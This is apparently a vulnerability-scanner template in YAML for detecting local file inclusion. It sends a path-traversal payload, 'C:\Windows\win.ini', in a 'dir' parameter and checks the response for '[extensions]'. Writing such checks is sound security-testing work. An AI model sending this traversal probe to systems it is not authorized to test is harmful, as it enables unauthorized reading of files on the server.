id: lfi6-1039
name: 'Traversal in dir'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via dir'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      dir:
        - 'C:\Windows\win.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[extensions]'
